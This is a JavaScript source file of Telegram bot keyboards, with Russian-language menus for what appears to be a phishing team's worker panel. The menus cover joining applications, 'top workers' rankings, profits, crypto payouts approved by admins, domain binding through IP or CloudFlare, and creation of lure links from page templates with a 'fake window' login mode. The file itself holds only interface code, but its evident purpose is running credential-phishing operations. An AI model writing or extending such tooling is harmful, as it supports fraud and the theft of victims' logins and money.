const { Markup } = require("telegraf");

function applicationStartKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("📨 Подать заявку", "menu:apply")],
  ]);
}

function rulesAcceptKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("✅ Принимаю", "app:rules_accept")],
  ]);
}

function acceptedStartKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("➡️ Далее", "menu:home")],
  ]);
}

function participantPanelKeyboard(isAdmin) {
  const rows = [
    [Markup.button.callback("👤 Профиль", "menu:profile")],
    [Markup.button.callback("🌐 Сайты", "menu:sites")],
    [
      Markup.button.callback("📘 О проекте", "menu:about"),
      Markup.button.callback("⚙️ Настройки", "menu:settings"),
    ],
    [Markup.button.callback("🏆 Топ воркеров", "menu:top_workers")],
  ];
  if (isAdmin) {
    rows.push([Markup.button.callback("🛠 Админ-панель", "admin:panel")]);
  }
  return Markup.inlineKeyboard(rows);
}

function profileKeyboard(selectedPeriod = "all") {
  const label = (period, text) =>
    selectedPeriod === period ? `• ${text} •` : text;

  return Markup.inlineKeyboard([
    [
      Markup.button.callback(label("all", "За все время"), "profile:stats:all"),
      Markup.button.callback(label("24h", "За 24 часа"), "profile:stats:24h"),
    ],
    [
      Markup.button.callback(label("7d", "За 7 дней"), "profile:stats:7d"),
      Markup.button.callback(label("30d", "За 30 дней"), "profile:stats:30d"),
    ],
    [Markup.button.callback("Мои профиты", "profile:profits")],
    [Markup.button.callback("Мой кошелек", "profile:wallet")],
    [Markup.button.callback("‹ Назад", "menu:home")],
  ]);
}

function walletKeyboard({ showWithdraw = false } = {}) {
  const rows = [[Markup.button.callback("История транзакций", "wallet:history")]];
  if (showWithdraw) {
    rows.push([Markup.button.callback("💸 Вывод", "wallet:withdraw")]);
  }
  rows.push([Markup.button.callback("‹ Назад", "menu:profile")]);
  return Markup.inlineKeyboard(rows);
}

function withdrawMethodKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("xRocketr", "wallet:method:xRocketr")],
    [Markup.button.callback("CryptoBot", "wallet:method:cryptobot")],
    [Markup.button.callback("USDT TON", "wallet:method:usdt_ton")],
    [Markup.button.callback("‹ Отмена", "profile:wallet")],
  ]);
}

function payoutModerationKeyboard(requestId) {
  const id = String(requestId);
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("✅ Одобрить выплату", `payout:approve:${id}`),
      Markup.button.callback("❌ Отклонить выплату", `payout:reject:${id}`),
    ],
  ]);
}

/**
 * @param {string} infoChannelUrl
 * @param {Record<string, string>} inviteUrls — уже созданные инвайты: workers_chat | payouts | manuals → https://t.me/...
 */
function aboutProjectKeyboard(infoChannelUrl = "https://t.me/cannabisImperia", inviteUrls = {}) {
  const infoUrl = String(infoChannelUrl || "https://t.me/cannabisImperia").trim();
  const inv = inviteUrls || {};
  const workersBtn = inv.workers_chat
    ? Markup.button.url("🐻 Чат воркеров", inv.workers_chat)
    : Markup.button.callback("🐻 Чат воркеров", "about:workers_chat");
  const payoutsBtn = inv.payouts
    ? Markup.button.url("🕊 Выплаты", inv.payouts)
    : Markup.button.callback("🕊 Выплаты", "about:payouts");
  const manualsBtn = inv.manuals
    ? Markup.button.url("📄 Мануалы", inv.manuals)
    : Markup.button.callback("📄 Мануалы", "about:manuals");

  return Markup.inlineKeyboard([
    [workersBtn, payoutsBtn],
    [manualsBtn, Markup.button.url("❗ Инфоканал", infoUrl)],
    [Markup.button.callback("📝 Правила", "about:rules")],
    [Markup.button.callback("‹ Назад", "menu:home")],
  ]);
}

function aboutRulesBackKeyboard() {
  return Markup.inlineKeyboard([[Markup.button.callback("‹ Назад", "menu:about")]]);
}

function settingsKeyboard(isNicknameOpen) {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback(
        isNicknameOpen ? "Никнейм в выплатах открыт" : "Никнейм в выплатах скрыт",
        "settings:toggle_nick"
      ),
    ],
    [Markup.button.callback("Добавить описание", "settings:add_description")],
    [Markup.button.callback("‹ Назад", "menu:home")],
  ]);
}

function topWorkersKeyboard(selectedPeriod = "all") {
  const label = (period, text) =>
    selectedPeriod === period ? `• ${text} •` : text;

  return Markup.inlineKeyboard([
    [
      Markup.button.callback(label("all", "За всё время"), "top:period:all"),
      Markup.button.callback(label("24h", "За 24 часа"), "top:period:24h"),
    ],
    [
      Markup.button.callback(label("7d", "За 7 дней"), "top:period:7d"),
      Markup.button.callback(label("30d", "За 30 дней"), "top:period:30d"),
    ],
    [Markup.button.callback("‹ Назад", "menu:home")],
  ]);
}

function sitesKeyboard(domains) {
  const rows = (domains || []).slice(0, 15).map((d) => [
    Markup.button.callback(`🌐 ${d.domain}`, `sites:domain:${d.id}`),
  ]);
  rows.push([Markup.button.callback("➕ Добавить домен", "sites:add")]);
  rows.push([Markup.button.callback("‹ Назад", "menu:home")]);
  return Markup.inlineKeyboard(rows);
}

function sitesBindMethodKeyboard() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("IP-адрес", "sites:bind:ip"),
      Markup.button.callback("CloudFlare", "sites:bind:cf"),
    ],
    [Markup.button.callback("‹ Назад", "menu:sites")],
  ]);
}

function domainLinksKeyboard(domainId, links = []) {
  const rows = (links || []).slice(0, 10).map((link) => [
    Markup.button.callback(`🔗 /${link.path || "rand"} | ${link.template?.name || "no-template"}`, "sites:links:noop"),
  ]);
  rows.push([Markup.button.callback("➕ Создать ссылку", `sites:link_create:${domainId}`)]);
  rows.push([Markup.button.callback("‹ Назад", "menu:sites")]);
  return Markup.inlineKeyboard(rows);
}

function linkCreatorKeyboard(domainId, state) {
  const templateLabel = state.templateName || "Шаблон не выбран";
  const pathLabel = state.path ? `/${state.path}` : "необязательно";
  const windowMap = {
    FakeWindow: "Фейк окно",
    CurrentWindow: "Текущее окно",
    NewWindow: "Новое окно",
    AboutBlank: "About:Blank",
  };

  return Markup.inlineKeyboard([
    [Markup.button.callback(`Адрес страницы: ${pathLabel}`, "sites:link:path")],
    [Markup.button.callback(`Шаблон: ${templateLabel}`, "sites:link:template")],
    [Markup.button.callback(`Окно: ${windowMap[state.windowType] || state.windowType}`, "sites:link:window")],
    [Markup.button.callback("✅ Создать ссылку", `sites:link:create:${domainId}`)],
    [Markup.button.callback("‹ Назад", `sites:domain:${domainId}`)],
  ]);
}

function linkWindowTypeKeyboard() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("Фейк окно", "sites:window:FakeWindow"),
      Markup.button.callback("Текущее окно", "sites:window:CurrentWindow"),
    ],
    [
      Markup.button.callback("Новое окно", "sites:window:NewWindow"),
      Markup.button.callback("About:Blank", "sites:window:AboutBlank"),
    ],
    [Markup.button.callback("‹ Назад", "sites:link:editor")],
  ]);
}

function templatesKeyboard(templates = []) {
  const rows = templates.slice(0, 15).map((tpl) => [
    Markup.button.callback(`📄 ${tpl.name}`.slice(0, 60), `sites:template:${tpl.id}`),
  ]);
  rows.push([Markup.button.callback("‹ Назад", "sites:link:editor")]);
  return Markup.inlineKeyboard(rows);
}

function teamDomainKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [Markup.button.callback("РЕФ.ССЫЛКА", `sites:ref:${domainId}`)],
    [Markup.button.callback("Создать ссылку", `sites:link_create:${domainId}`)],
    [Markup.button.callback("‹ Назад", "menu:sites")],
  ]);
}

function referralLinkKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("Изменить шаблон", `sites:ref:template:${domainId}`),
      Markup.button.callback("Изменить окно авторизации", `sites:ref:window:${domainId}`),
    ],
    [Markup.button.callback("‹ Назад", `sites:domain:${domainId}`)],
  ]);
}

function referralWindowKeyboard(domainId) {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("Фейк окно", `sites:ref:win:${domainId}:FakeWindow`),
      Markup.button.callback("Текущее окно", `sites:ref:win:${domainId}:CurrentWindow`),
    ],
    [
      Markup.button.callback("Новое окно", `sites:ref:win:${domainId}:NewWindow`),
      Markup.button.callback("About:Blank", `sites:ref:win:${domainId}:AboutBlank`),
    ],
    [Markup.button.callback("‹ Назад", `sites:ref:back:${domainId}`)],
  ]);
}

function referralTemplatesPageKeyboard(domainId, rows, page, hasPrev, hasNext) {
  const tplButtons = (rows || []).map((tpl) => {
    const label = `🖼 ${String(tpl.name || tpl.id).slice(0, 50)}`;
    return [Markup.button.callback(label, `sites:ref:tpv:${domainId}:${tpl.id}`)];
  });
  const navRow = [];
  if (hasPrev) navRow.push(Markup.button.callback("◀️ Стр.", `sites:ref:tplpage:${domainId}:${page - 1}`));
  if (hasNext) navRow.push(Markup.button.callback("Стр. ▶️", `sites:ref:tplpage:${domainId}:${page + 1}`));
  const kbRows = [...tplButtons];
  if (navRow.length) kbRows.push(navRow);
  kbRows.push([Markup.button.callback("‹ Назад к ссылке", `sites:ref:back:${domainId}`)]);
  return Markup.inlineKeyboard(kbRows);
}

function referralTemplatePreviewKeyboard(domainId, templateId) {
  return Markup.inlineKeyboard([
    [Markup.button.callback("✅ Применить этот шаблон", `sites:ref:tset:${domainId}:${templateId}`)],
    [Markup.button.callback("‹ К списку шаблонов", `sites:ref:template:${domainId}`)],
  ]);
}

module.exports = {
  applicationStartKeyboard,
  rulesAcceptKeyboard,
  acceptedStartKeyboard,
  participantPanelKeyboard,
  profileKeyboard,
  walletKeyboard,
  withdrawMethodKeyboard,
  payoutModerationKeyboard,
  aboutProjectKeyboard,
  aboutRulesBackKeyboard,
  settingsKeyboard,
  topWorkersKeyboard,
  sitesKeyboard,
  sitesBindMethodKeyboard,
  domainLinksKeyboard,
  linkCreatorKeyboard,
  linkWindowTypeKeyboard,
  templatesKeyboard,
  teamDomainKeyboard,
  referralLinkKeyboard,
  referralWindowKeyboard,
  referralTemplatesPageKeyboard,
  referralTemplatePreviewKeyboard,
};
